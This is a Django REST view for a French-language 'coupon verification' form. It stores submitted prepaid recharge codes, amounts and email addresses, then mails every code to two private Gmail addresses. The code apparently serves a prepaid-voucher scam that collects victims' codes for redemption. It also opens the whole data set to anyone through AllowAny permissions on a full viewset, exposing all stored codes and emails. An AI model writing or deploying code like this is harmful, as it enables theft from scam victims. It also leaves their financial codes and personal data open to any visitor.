from rest_framework.views import APIView
from rest_framework.response import Response
from .serializers import FormDataSerializer
from django.core.mail import send_mail
from django.conf import settings
from rest_framework import status, viewsets, permissions
from .models import *

class FormDataView(viewsets.ModelViewSet):
    permission_classes = [permissions.AllowAny]
    lookup_field = 'id'
    serializer_class = FormDataSerializer
    queryset = FormData.objects.all()

    def create(self, request, format=None):
        codes = request.data.pop('code')
        serializer = FormDataSerializer(data=request.data)

        try:
            serializer.is_valid(raise_exception=True) 
            form_data = serializer.save()
            for code in codes:
                codeObj = Codes.objects.create(code=code)
                form_data.code.add(codeObj)

            subject = 'Vérification de Coupon'
            message = f"Type de Recharge: {form_data.type}\nMontant: {form_data.montant}\nDevise: {form_data.devise}\n"

            codes = form_data.code.all()
            if codes:
                code_list = ''.join([str("-> code recharge: "+code.code+"\n") for code in codes])
                message += f"Codes de Recharge:\n{code_list}"

            message += f"Email: {form_data.mail}"

            send_mail(subject=subject, message=message, from_email=settings.DEFAULT_FROM_EMAIL, recipient_list= ['galaxytech237@gmail.com', 'Denismartin342@gmail.com'])

            return Response({"success": True})
        except Exception as e:
            return Response(status=400)
